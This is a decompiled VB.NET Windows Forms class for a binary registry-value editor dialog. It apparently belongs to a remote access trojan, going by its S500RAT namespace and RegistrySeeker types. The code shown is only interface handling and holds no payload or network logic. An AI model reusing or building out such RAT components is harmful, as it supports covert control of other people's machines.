Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Gry.Helper
Imports Gry.Helper.HexEditor
Imports Microsoft.VisualBasic.CompilerServices

Namespace S500RAT
	' Token: 0x02000029 RID: 41
	<DesignerGenerated()>
	Public Partial Class FormRegValueEditBinary
		Inherits Form

		' Token: 0x17000338 RID: 824
		' (get) Token: 0x06000824 RID: 2084 RVA: 0x000439B2 File Offset: 0x00041BB2
		' (set) Token: 0x06000825 RID: 2085 RVA: 0x000439BC File Offset: 0x00041BBC
		Private Overridable Property okButton As Button
			<CompilerGenerated()>
			Get
				Return Me._okButton
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.OkButton_Click
				Dim okButton As Button = Me._okButton
				If okButton IsNot Nothing Then
					RemoveHandler okButton.Click, value2
				End If
				Me._okButton = value
				okButton = Me._okButton
				If okButton IsNot Nothing Then
					AddHandler okButton.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000339 RID: 825
		' (get) Token: 0x06000826 RID: 2086 RVA: 0x000439FF File Offset: 0x00041BFF
		' (set) Token: 0x06000827 RID: 2087 RVA: 0x00043A09 File Offset: 0x00041C09
		Private Overridable Property label2 As Label

		' Token: 0x1700033A RID: 826
		' (get) Token: 0x06000828 RID: 2088 RVA: 0x00043A12 File Offset: 0x00041C12
		' (set) Token: 0x06000829 RID: 2089 RVA: 0x00043A1C File Offset: 0x00041C1C
		Private Overridable Property valueNameTxtBox As TextBox

		' Token: 0x1700033B RID: 827
		' (get) Token: 0x0600082A RID: 2090 RVA: 0x00043A25 File Offset: 0x00041C25
		' (set) Token: 0x0600082B RID: 2091 RVA: 0x00043A2F File Offset: 0x00041C2F
		Private Overridable Property label1 As Label

		' Token: 0x1700033C RID: 828
		' (get) Token: 0x0600082C RID: 2092 RVA: 0x00043A38 File Offset: 0x00041C38
		' (set) Token: 0x0600082D RID: 2093 RVA: 0x00043A42 File Offset: 0x00041C42
		Friend Overridable Property hexEditor As HexEditor

		' Token: 0x1700033D RID: 829
		' (get) Token: 0x0600082E RID: 2094 RVA: 0x00043A4B File Offset: 0x00041C4B
		' (set) Token: 0x0600082F RID: 2095 RVA: 0x00043A58 File Offset: 0x00041C58
		Private Overridable Property Button1 As Button
			<CompilerGenerated()>
			Get
				Return Me._Button1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				Dim button As Button = Me._Button1
				If button IsNot Nothing Then
					RemoveHandler button.Click, value2
				End If
				Me._Button1 = value
				button = Me._Button1
				If button IsNot Nothing Then
					AddHandler button.Click, value2
				End If
			End Set
		End Property

		' Token: 0x06000830 RID: 2096 RVA: 0x00043A9C File Offset: 0x00041C9C
		Public Sub New(value As RegistrySeeker.RegValueData)
			AddHandler MyBase.Load, AddressOf Me.FormRegValueEditBinary_Load
			Me._value = value
			Me.InitializeComponent()
			Me.valueNameTxtBox.Text = RegValueHelper.GetName(value.Name)
			Me.hexEditor.HexTable = value.Data
		End Sub

		' Token: 0x06000831 RID: 2097 RVA: 0x00043AFB File Offset: 0x00041CFB
		Private Sub FormRegValueEditBinary_Load(sender As Object, e As EventArgs)
			Me.MinimumSize = MyBase.Size
		End Sub

		' Token: 0x06000832 RID: 2098 RVA: 0x00043B0C File Offset: 0x00041D0C
		Private Sub OkButton_Click(sender As Object, e As EventArgs)
			Dim hexTable As Byte() = Me.hexEditor.HexTable
			Dim flag As Boolean = hexTable IsNot Nothing
			If flag Then
				Try
					Me._value.Data = hexTable
					MyBase.DialogResult = DialogResult.OK
					MyBase.Tag = Me._value
				Catch ex As Exception
					Me.ShowWarning("The binary value was invalid and could not be converted correctly.", "Warning")
					MyBase.DialogResult = DialogResult.None
				End Try
			End If
			MyBase.Close()
		End Sub

		' Token: 0x06000833 RID: 2099 RVA: 0x00043B94 File Offset: 0x00041D94
		Private Sub ShowWarning(msg As String, caption As String)
			MessageBox.Show(msg, caption, MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
		End Sub

		' Token: 0x06000834 RID: 2100 RVA: 0x00043BA2 File Offset: 0x00041DA2
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			MyBase.Close()
		End Sub

		' Token: 0x040003A2 RID: 930
		Private _value As RegistrySeeker.RegValueData

		' Token: 0x040003A3 RID: 931
		Private Const INVALID_BINARY_ERROR As String = "The binary value was invalid and could not be converted correctly."
	End Class
End Namespace
